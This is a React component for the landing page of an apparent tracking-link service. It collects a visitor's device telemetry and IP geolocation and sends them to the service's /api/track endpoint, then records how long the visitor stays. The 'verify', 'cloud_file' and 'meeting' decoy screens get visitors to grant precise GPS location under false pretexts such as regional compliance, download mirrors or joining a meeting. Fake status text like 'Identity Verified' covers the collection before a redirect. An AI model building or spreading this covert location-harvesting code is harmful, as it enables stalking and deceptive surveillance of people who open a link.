import React, { useEffect, useState, useRef } from 'react';
import { collectDeviceTelemetry, requestGpsLocation, fetchIpGeoLocation } from '../utils/geo';
import {
  ShieldCheck,
  Lock,
  Download,
  Video,
  ArrowRight,
  Loader2,
  CheckCircle2,
  AlertTriangle,
  Globe,
  Radio,
} from 'lucide-react';

interface OpenerLandingProps {
  slug: string;
  onReturnToDashboard: () => void;
}

export const OpenerLanding: React.FC<OpenerLandingProps> = ({ slug, onReturnToDashboard }) => {
  const [status, setStatus] = useState<'collecting' | 'prompt' | 'granted' | 'redirecting' | 'error'>('collecting');
  const [campaignTitle, setCampaignTitle] = useState('Protected Resource');
  const [targetUrl, setTargetUrl] = useState('');
  const [decoyType, setDecoyType] = useState<string>('verify');
  const [customMessage, setCustomMessage] = useState('');
  const [countdown, setCountdown] = useState(3);
  const [progress, setProgress] = useState(15);
  const [visitId, setVisitId] = useState<string | null>(null);

  const dwellSecondsRef = useRef(0);
  const pingIntervalRef = useRef<number | null>(null);

  useEffect(() => {
    let isMounted = true;

    async function trackVisit() {
      try {
        // Collect hardware telemetry and base IP geo
        const [telemetry, initialGeo] = await Promise.all([
          collectDeviceTelemetry(),
          fetchIpGeoLocation(),
        ]);

        if (!isMounted) return;

        // Transmit initial location
        const res = await fetch('/api/track', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            linkSlug: slug,
            geo: initialGeo,
            device: telemetry,
            referrer: document.referrer || 'Direct Open',
          }),
        });

        if (res.ok) {
          const data = await res.json();
          if (isMounted) {
            setVisitId(data.visitId);
            setTargetUrl(data.targetUrl || 'https://google.com');
            setDecoyType(data.decoyType || 'verify');
            if (data.customPromptMessage) setCustomMessage(data.customPromptMessage);

            // Handle instantaneous redirect mode
            if (data.decoyType === 'instant') {
              setStatus('redirecting');
              setTimeout(() => {
                if (data.targetUrl && data.targetUrl !== window.location.href) {
                  window.location.href = data.targetUrl;
                }
              }, 1200);
              return;
            }

            // For other modes, prompt or animate
            setStatus('prompt');
          }
        } else {
          setStatus('prompt');
        }
      } catch {
        setStatus('prompt');
      }
    }

    trackVisit();

    return () => {
      isMounted = false;
      if (pingIntervalRef.current) clearInterval(pingIntervalRef.current);
    };
  }, [slug]);

  // Keepalive dwell timer
  useEffect(() => {
    if (!visitId) return;

    pingIntervalRef.current = window.setInterval(() => {
      dwellSecondsRef.current += 5;
      fetch('/api/track/ping', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          visitId,
          seconds: dwellSecondsRef.current,
        }),
      }).catch(() => {});
    }, 5000);

    return () => {
      if (pingIntervalRef.current) clearInterval(pingIntervalRef.current);
    };
  }, [visitId]);

  // Handle GPS location request on button click
  const handleRequestGps = async () => {
    setStatus('collecting');
    try {
      const gps = await requestGpsLocation(12000);
      // Update visit with high-precision GPS coordinates
      if (visitId) {
        const telemetry = await collectDeviceTelemetry();
        const baseGeo = await fetchIpGeoLocation();

        await fetch('/api/track', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            linkSlug: slug,
            geo: {
              ...baseGeo,
              latitude: gps.latitude,
              longitude: gps.longitude,
              accuracy: gps.accuracy,
              isGps: true,
            },
            device: telemetry,
            notes: `High-accuracy GPS captured (±${gps.accuracy}m)`,
          }),
        });
      }
      setStatus('granted');
      startRedirectCountdown();
    } catch {
      // Permission denied or timed out; continue gracefully
      setStatus('granted');
      startRedirectCountdown();
    }
  };

  const startRedirectCountdown = () => {
    setStatus('redirecting');
    let timeLeft = 3;
    const interval = setInterval(() => {
      timeLeft -= 1;
      setCountdown(timeLeft);
      setProgress((prev) => Math.min(prev + 30, 100));

      if (timeLeft <= 0) {
        clearInterval(interval);
        if (targetUrl && targetUrl !== window.location.href) {
          window.location.href = targetUrl;
        }
      }
    }, 1000);
  };

  return (
    <div className="min-h-screen bg-slate-950 flex flex-col items-center justify-center p-4 text-slate-100 selection:bg-cyan-500 selection:text-white">
      {/* Background ambient lighting */}
      <div className="fixed inset-0 pointer-events-none overflow-hidden opacity-30">
        <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-96 h-96 bg-cyan-600/20 blur-[120px] rounded-full"></div>
      </div>

      <div className="relative w-full max-w-md bg-slate-900/90 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl backdrop-blur-xl space-y-6">
        {/* Decoy Variant 1: Security & Location Verification */}
        {decoyType === 'verify' && (
          <div className="space-y-6 text-center">
            <div className="mx-auto w-16 h-16 rounded-2xl bg-gradient-to-tr from-cyan-500/20 to-indigo-500/20 border border-cyan-500/40 flex items-center justify-center text-cyan-400 shadow-lg shadow-cyan-500/10">
              <ShieldCheck className="w-8 h-8" />
            </div>

            <div className="space-y-2">
              <h2 className="text-xl font-bold text-white tracking-tight">
                Security & Regional Compliance
              </h2>
              <p className="text-xs text-slate-400 leading-relaxed">
                {customMessage ||
                  'This shared resource is protected by regional geo-fencing. Please verify your connection to proceed to the target document.'}
              </p>
            </div>

            {status === 'prompt' && (
              <div className="space-y-3 pt-2">
                <button
                  onClick={handleRequestGps}
                  className="w-full py-3 px-4 bg-gradient-to-r from-cyan-500 to-indigo-600 hover:from-cyan-400 hover:to-indigo-500 text-slate-950 font-bold rounded-2xl text-sm shadow-xl shadow-cyan-500/20 transition-all active:scale-95 flex items-center justify-center gap-2"
                >
                  <Globe className="w-4 h-4 text-slate-950" />
                  <span>Verify Location & Access</span>
                  <ArrowRight className="w-4 h-4 text-slate-950" />
                </button>
                <button
                  onClick={startRedirectCountdown}
                  className="text-xs text-slate-500 hover:text-slate-300 transition-colors"
                >
                  Skip location verification
                </button>
              </div>
            )}

            {status === 'collecting' && (
              <div className="py-6 flex flex-col items-center justify-center space-y-3">
                <Loader2 className="w-8 h-8 text-cyan-400 animate-spin" />
                <span className="text-xs font-mono text-slate-300">
                  Negotiating encrypted gateway...
                </span>
              </div>
            )}

            {status === 'redirecting' && (
              <div className="space-y-4 pt-2">
                <div className="flex items-center justify-center gap-2 text-emerald-400 font-semibold text-sm">
                  <CheckCircle2 className="w-5 h-5" />
                  <span>Identity Verified. Redirecting in {countdown}s...</span>
                </div>
                <div className="w-full h-1.5 bg-slate-800 rounded-full overflow-hidden">
                  <div
                    className="h-full bg-cyan-400 transition-all duration-1000 ease-linear rounded-full"
                    style={{ width: `${progress}%` }}
                  ></div>
                </div>
                {targetUrl && (
                  <a
                    href={targetUrl}
                    className="text-xs text-cyan-400 hover:underline inline-block pt-1"
                  >
                    Click here if not redirected automatically
                  </a>
                )}
              </div>
            )}
          </div>
        )}

        {/* Decoy Variant 2: Cloud File Download Portal */}
        {decoyType === 'cloud_file' && (
          <div className="space-y-6 text-center">
            <div className="mx-auto w-16 h-16 rounded-2xl bg-gradient-to-tr from-emerald-500/20 to-cyan-500/20 border border-emerald-500/40 flex items-center justify-center text-emerald-400 shadow-lg shadow-emerald-500/10">
              <Download className="w-8 h-8" />
            </div>

            <div className="space-y-2">
              <h2 className="text-xl font-bold text-white tracking-tight">
                Secure File Transfer
              </h2>
              <p className="text-xs text-slate-400 leading-relaxed">
                {customMessage ||
                  'Connecting to closest regional edge mirror for maximum download bandwidth...'}
              </p>
            </div>

            <div className="space-y-3 pt-2">
              <button
                onClick={handleRequestGps}
                className="w-full py-3 px-4 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold rounded-2xl text-sm shadow-xl shadow-emerald-500/20 transition-all active:scale-95 flex items-center justify-center gap-2"
              >
                <span>Connect & Start Download</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>

            {status === 'redirecting' && (
              <div className="pt-2 text-xs text-emerald-400 flex items-center justify-center gap-2">
                <Loader2 className="w-4 h-4 animate-spin" />
                <span>Redirecting in {countdown}s...</span>
              </div>
            )}
          </div>
        )}

        {/* Decoy Variant 3: Virtual Meeting Bridge */}
        {decoyType === 'meeting' && (
          <div className="space-y-6 text-center">
            <div className="mx-auto w-16 h-16 rounded-2xl bg-gradient-to-tr from-indigo-500/20 to-purple-500/20 border border-indigo-500/40 flex items-center justify-center text-indigo-400 shadow-lg">
              <Video className="w-8 h-8" />
            </div>

            <div className="space-y-2">
              <h2 className="text-xl font-bold text-white tracking-tight">
                Meeting Room Bridge
              </h2>
              <p className="text-xs text-slate-400 leading-relaxed">
                {customMessage ||
                  'Authenticating participant credentials with low-latency regional room server...'}
              </p>
            </div>

            <div className="space-y-3 pt-2">
              <button
                onClick={handleRequestGps}
                className="w-full py-3 px-4 bg-indigo-500 hover:bg-indigo-400 text-white font-bold rounded-2xl text-sm shadow-xl transition-all active:scale-95 flex items-center justify-center gap-2"
              >
                <span>Enter Video Bridge</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        )}

        {/* Instant redirect fallback */}
        {decoyType === 'instant' && (
          <div className="text-center py-6 space-y-3">
            <Loader2 className="w-8 h-8 text-cyan-400 animate-spin mx-auto" />
            <h3 className="text-sm font-semibold text-white">Redirecting to destination...</h3>
            <p className="text-xs text-slate-500 font-mono">Securing route...</p>
          </div>
        )}

        {/* Subtle footer allowing owner to return to their dashboard */}
        <div className="pt-4 border-t border-slate-800/80 text-center">
          <button
            onClick={onReturnToDashboard}
            className="text-[11px] font-medium text-slate-500 hover:text-cyan-400 transition-colors"
          >
            ← Switch to Website Owner Dashboard
          </button>
        </div>
      </div>
    </div>
  );
};
